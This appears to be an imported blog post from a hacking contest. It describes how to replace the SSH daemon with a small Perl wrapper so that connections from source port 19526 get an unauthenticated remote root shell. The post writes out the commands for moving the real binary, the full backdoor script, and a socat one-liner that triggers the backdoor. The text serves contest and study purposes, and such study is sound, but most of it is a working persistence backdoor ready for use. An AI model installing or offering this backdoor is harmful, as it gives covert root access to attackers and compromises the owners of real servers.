---
title: [Hacking-Contest] SSH Server wrapper
source: http://www.jakoblell.com/blog/2014/05/07/hacking-contest-ssh-server-wrapper/
kind: external
domain: observability
author: Jakob
original_date: 2014-05-07
fetched_at: 2026-05-16
bookmark_title: [Hacking-Contest] SSH Server wrapper | Jakob Lell's Blog
tags: [external, observability]
---

> [!info] 外部文章 · 自动导入
> 来源：[www.jakoblell.com](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-ssh-server-wrapper/)
> 作者：Jakob
> 原始日期：2014-05-07
> 抓取日期：2026-05-16

# [Hacking-Contest] SSH Server wrapper

This blogpost shows how the SSH server can be replaced with a small wrapper script to allow full unauthenticated remote root access without disturbing the normal operation of the service. In order to install the wrapper script, the original SSH server must be renamed or moved to another directory. I have chosen to just move the binary from /usr/sbin/ to /usr/bin/:

cd /usr/sbin mv sshd ../bin vi sshd |

Then type in the following small wrapper script:

#!/usr/bin/perl exec"/bin/sh"if(getpeername(STDIN)=~/^..LF/); exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV; |

Finally the wrapper script must be made executable e.g. with the following command:

chmod 755 sshd |

In the normal operation of the ssh server, the wrapper script just executes the original sshd binary (which has been moved to /usr/bin/sshd) with all the given command-line arguments. If STDIN is a socket and the source port of the connected client happens to be 19526 (the string "LF" converted from ASCII to a big-endian 16 bit integer), the wrapper however executes /bin/sh instead, which gives the client an unauthenticated remote root shell.

Like many other network services, the OpenSSH server forks a new child process when receiving a new TCP connection. However, contrary to most other services, it doesn't directly serve the client in the child process after the fork. Instead it re-executes its own binary (typically /usr/sbin/sshd) in the child process so that the client is handled by a new instance of the sshd process (which makes ASLR more effective by giving each child process a different randomized memory layout). For this child process, the file descriptors STDIN/STDOUT are connected to the client socket.

In order to exploit the backdoor to get a remote root shell, you have to connect to the SSH service from source port 19526, which can easily be achieved with the following command:

socat STDIO TCP4:target_ip:22,sourceport=19526 |